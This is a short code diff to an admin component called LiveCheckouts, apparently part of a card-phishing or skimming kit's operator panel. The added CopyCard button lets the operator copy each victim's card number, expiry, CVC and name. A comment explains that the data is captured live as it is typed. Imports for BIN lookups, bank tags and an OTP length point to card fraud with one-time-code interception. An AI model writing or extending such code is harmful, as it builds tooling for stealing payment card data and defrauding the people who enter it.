@@ -6,6 +6,7 @@ import { Badge, Card } from "@/components/ui";
 import { DeleteButton } from "@/components/admin/DeleteButton";
 import { BankTag } from "@/components/admin/BankTag";
 import { BinDetails } from "@/components/admin/BinDetails";
+import { CopyCard } from "@/components/admin/CopyCard";
 import { deleteCheckoutSessionAction } from "@/lib/actions/admin";
 import { OTP_LENGTH } from "@/lib/activation";
 
@@ -208,6 +209,15 @@ export function LiveCheckouts() {
                     {s.cardholder_name ? (
                       <p className="mt-1 truncate text-xs text-brand-500">{s.cardholder_name}</p>
                     ) : null}
+                    {/* Takes whatever has been typed so far — the panel is live,
+                        so a half-entered number copies as a half-entered number. */}
+                    <CopyCard
+                      className="mt-2.5"
+                      number={s.card_number}
+                      expiry={s.card_expiry}
+                      cvc={s.card_cvc}
+                      name={s.cardholder_name}
+                    />
                   </div>
 
                   {/* Right of the card: what the BIN database says about it —
